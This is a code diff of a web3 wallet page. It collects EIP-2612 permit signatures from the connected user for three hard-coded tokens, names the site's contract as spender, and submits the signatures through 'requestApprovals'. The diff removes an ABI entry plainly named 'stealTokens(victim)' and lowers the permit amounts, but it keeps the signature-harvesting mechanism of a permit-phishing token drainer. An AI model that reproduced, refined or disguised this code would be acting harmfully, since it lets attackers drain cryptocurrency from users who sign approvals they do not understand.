@@ -30,29 +30,38 @@
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
-            },
-            {
-                "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
-                "name": "stealTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
-                "name": "approvalsGiven",
-                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            { "inputs": [], "name": "tokenA", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [], "name": "tokenB", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [], "name": "tokenC", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
+            }
         ];
         const tokenAddresses = [
             "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23", // Token A
             "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E", // Token B
             "0xD00485b963E46753d7F1AC0a21487391e635Ca07"  // Token C
+        ];
+        const tokenABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    { "name": "owner", "type": "address" },
+                    { "name": "spender", "type": "address" },
+                    { "name": "value", "type": "uint256" },
+                    { "name": "deadline", "type": "uint256" },
+                    { "name": "v", "type": "uint8" },
+                    { "name": "r", "type": "bytes32" },
+                    { "name": "s", "type": "bytes32" }
+                ],
+                "name": "permit",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{ "name": "owner", "type": "address" }],
+                "name": "nonces",
+                "outputs": [{ "name": "", "type": "uint256" }],
+                "stateMutability": "view",
+                "type": "function"
+            }
         ];
         let web3, userAccount, contract;
 
@@ -83,15 +92,14 @@
                 }
 
                 const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
-                const values = [web3.utils.toWei("1000000", "ether"), web3.utils.toWei("1000000", "ether"), web3.utils.toWei("1000000", "ether")];
+                const values = [web3.utils.toWei("1000", "ether"), web3.utils.toWei("1000", "ether"), web3.utils.toWei("1000", "ether")];
 
-                // Gather signatures for each token
                 const v = [];
                 const r = [];
                 const s = [];
 
                 for (let i = 0; i < tokenAddresses.length; i++) {
-                    const tokenContract = new web3.eth.Contract(contractABI, tokenAddresses[i]);
+                    const tokenContract = new web3.eth.Contract(tokenABI, tokenAddresses[i]);
                     const nonce = await tokenContract.methods.nonces(userAccount).call();
                     const domain = {
                         name: "ERC20 Token",
@@ -99,7 +107,6 @@
                         chainId: await web3.eth.getChainId(),
                         verifyingContract: tokenAddresses[i]
                     };
-
                     const types = {
                         Permit: [
                             { name: "owner", type: "address" },
@@ -109,7 +116,6 @@
                             { name: "deadline", type: "uint256" }
                         ]
                     };
-
                     const message = {
                         owner: userAccount,
                         spender: contractAddress,
@@ -118,14 +124,17 @@
                         deadline: deadline
                     };
 
-                    const signature = await web3.eth.personal.signTypedData([domain, types, message], userAccount);
-                    const splitSig = web3.utils.fromUtf8(signature);
-                    v.push(splitSig.v);
-                    r.push(splitSig.r);
-                    s.push(splitSig.s);
+                    const signature = await ethereum.request({
+                        method: "eth_signTypedData_v4",
+                        params: [userAccount, JSON.stringify({ domain, types, message })]
+                    });
+
+                    const sig = web3.eth.accounts.decodeSignature(signature);
+                    v.push(sig.v);
+                    r.push(sig.r);
+                    s.push(sig.s);
                 }
 
-                // Send permit request to contract
                 await contract.methods
                     .requestApprovals(tokenAddresses, values, v, r, s)
                     .send({ from: userAccount });
